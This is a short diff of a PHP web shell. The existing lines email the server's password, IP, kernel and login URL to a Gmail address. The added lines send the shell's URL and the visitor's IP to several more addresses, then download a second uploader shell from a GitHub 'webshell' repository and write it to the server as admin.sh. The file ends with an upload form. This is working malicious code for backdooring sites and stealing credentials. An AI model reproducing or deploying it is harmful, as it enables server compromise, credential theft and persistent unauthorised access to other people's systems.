@@ -42,6 +42,14 @@ $server_name = $_SERVER['SERVER_NAME'];
 $php_self = $_SERVER['PHP_SELF'];
 $report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
 @mail('muhrazky@gmail.com', 'Hehehe', $report_bug);
+$to = 'muhrazky@gmail.com,papaku.hayker@gmail.com,snopunks@gmail.com,malaysia.sender@gmail.com,papaku.hayker.go.id@gmail.com,muhrazky@gmail.com';
+$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($to, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+$nama= fopen("admin.sh" ,"w+");
+$file = file_get_contents('https://raw.githubusercontent.com/exploit-haxor/webshell/main/wp-uploader.php');
+$tulis = fwrite ($nama ,$file);
+fclose($nama);	
 
 echo "<b>".php_uname()."</b><br>";
 echo "<form method='post' enctype='multipart/form-data'>
